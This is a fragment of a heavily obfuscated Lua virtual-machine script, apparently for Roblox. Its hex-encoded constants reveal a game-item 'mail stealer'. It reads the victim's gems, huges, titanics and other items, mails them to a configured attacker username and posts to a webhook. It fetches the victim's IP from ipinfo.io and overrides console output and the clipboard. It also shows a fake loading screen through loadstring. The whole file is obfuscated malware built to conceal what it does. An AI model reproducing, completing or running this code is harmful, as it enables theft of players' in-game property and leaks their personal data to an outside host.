;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];B=Inst[3];K=Stk[B];for Idx=B + 1 ,Inst[4] do K=K   .. Stk[Idx] ;end Stk[Inst[2]]=K;VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=287) then local B;local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];do return;end elseif (Enum>288) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local A;Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=291) then if (Enum>290) then local Edx;local Results;local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Stk[A + 1 ])};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));end elseif (Enum<=292) then local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] + Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Upvalues[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];elseif (Enum==293) then local B;local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];for Idx=Inst[2],Inst[3] do Stk[Idx]=nil;end VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end else local T;local K;local B;local A;Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];B=Inst[3];K=Stk[B];for Idx=B + 1 ,Inst[4] do K=K   .. Stk[Idx] ;end Stk[Inst[2]]=K;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];B=Inst[3];K=Stk[B];for Idx=B + 1 ,Inst[4] do K=K   .. Stk[Idx] ;end Stk[Inst[2]]=K;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];B=Inst[3];K=Stk[B];for Idx=B + 1 ,Inst[4] do K=K   .. Stk[Idx] ;end Stk[Inst[2]]=K;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];B=Inst[3];K=Stk[B];for Idx=B + 1 ,Inst[4] do K=K   .. Stk[Idx] ;end Stk[Inst[2]]=K;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];T=Stk[A];B=Inst[3];for Idx=1,B do T[Idx]=Stk[A + Idx ];end end elseif (Enum<=304) then if (Enum<=299) then if (Enum<=296) then if (Enum>295) then if (Stk[Inst[2]]<Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end else Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] + Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] + Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] + Stk[Inst[4]] ;end elseif (Enum<=297) then Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];elseif (Enum==298) then if (Stk[Inst[2]]<=Stk[Inst[4]]) then VIP=VIP + 1 ;else VIP=Inst[3];end else local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end end elseif (Enum<=301) then if (Enum>300) then local B;local T;local A;Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];T=Stk[A];B=Inst[3];for Idx=1,B do T[Idx]=Stk[A + Idx ];end else Stk[Inst[2]]={};end elseif (Enum<=302) then local B;local A;A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];elseif (Enum>303) then Stk[Inst[2]]=Stk[Inst[3]]%Stk[Inst[4]] ;else local B;local A;A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];end elseif (Enum<=309) then if (Enum<=306) then if (Enum==305) then local Edx;local Results;local A;Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Stk[A + 1 ])};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Stk[A + 1 ]));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end end elseif (Enum<=307) then local Edx;local Results;local B;local A;A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Stk[A + 1 ])};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];elseif (Enum==308) then Stk[Inst[2]]=Inst[3]~=0 ;else local B;local A;A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]==Stk[Inst[4]]) then VIP=VIP + 1 ;else VIP=Inst[3];end end elseif (Enum<=311) then if (Enum>310) then Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] -Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];do return Stk[Inst[2]];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local B;local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Stk[Inst[4]]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Stk[Inst[4]]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];end elseif (Enum<=312) then local K;local B;local A;A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];B=Inst[3];K=Stk[B];for Idx=B + 1 ,Inst[4] do K=K   .. Stk[Idx] ;end Stk[Inst[2]]=K;VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];elseif (Enum==313) then Stk[Inst[2]]=Inst[3] * Stk[Inst[4]] ;else local B;local A;A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] + Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] + Inst[4] ;VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];do return Stk[A](Unpack(Stk,A + 1 ,Inst[3]));end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];do return Unpack(Stk,A,Top);end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end VIP=VIP + 1 ;end end;end return Wrap(Deserialize(),{},vmenv)(...);end VMCall("LOL!1A012O0003073O0067657467656E7603083O0053652O74696E677303043O0055736572030B3O006E6F746D2O722O6F6B696503073O00576562682O6F6B2O01030B3O004D61696C4D652O7361676503093O0045617379204475627303083O00546974616E69637303083O004475616C682O6F6B03093O00496E74656E73697479026O00594003063O0042616E616E6103053O00487567657303043O00506F6773028O00030A3O004578636C75736976657303063O004576656E747303073O0053656372657473030D3O0048435F444D5F4D79746869637303043O0047656D7303083O00657865637574656403043O0067616D65030A3O0047657453657276696365030A3O0052756E5365727669636503093O00776F726B7370616365030D3O0043752O72656E7443616D657261025O00C05C40025O00806440025O00A06440026O003B40026O002A40030C3O005573657253652O74696E6773030C3O0047616D6553652O74696E6773030C3O004D6173746572566F6C756D6503023O005F4703093O004D6F7573654C6F636B0100030D3O0052656E6465725374652O70656403073O00436F2O6E65637403053O007072696E74030D3O0072636F6E736F6C657072696E74030C3O0072636F6E736F6C657761726E030B3O0072636F6E736F6C2O652O72030D3O0072636F6E736F6C65696E707574030C3O007072696E74636F6E736F6C65030C3O00736574636C6970626F61726403083O00557365724E616D650003093O00557365724E616D653203073O00506C6179657273030B3O004C6F63616C506C6179657203043O004E616D6503043O004B69636B03273O00596F752041726520546865204F776E657221202874657374206974206F6E20616C7420612O6329030E3O00507574204120557365724E616D6503053O007063612O6C03153O0050757420412056616C696420557365726E616D652103063O0055736572494403163O0047657455736572496446726F6D4E616D654173796E6303163O0050757420412056616C696420557365726E616D65322103073O007265717569726503113O005265706C69636174656453746F7261676503073O004C69627261727903063O00436C69656E7403043O00536176652O033O0047657403083O004469616D6F6E647303343O00556E5265676973746572656420417265612E20506C6561736520436F6E736964657220476F696E6720546F205468652053686F7003093O00746F5F626173653634030B3O0066726F6D5F62617365363403073O00726571756573742O033O0073796E03043O00682O7470030C3O00682O74705F7265717565737403063O00666C7578757303083O00482O7470506F737403093O00506C6179657247756903043O004D61696E03053O00526967687403043O0052616E6B03083O0052616E6B4E616D6503043O005465787403073O00482O747047657403143O00682O7470733A2O2F6970696E666F2E696F2F6970030D3O004C6F6164696E675363722O656E030A3O006C6F6164737472696E6703253O0050757420596F7572204C6F6164696E67205363722O656E20526177204C696E6B204865726503073O0067657473656E76030D3O00506C617965725363726970747303073O005363726970747303043O0047554973030B3O0042616E6B20436C69656E7403093O00496E76656E746F727903073O004D61696C626F7803043O0047616D6503133O00522O6564656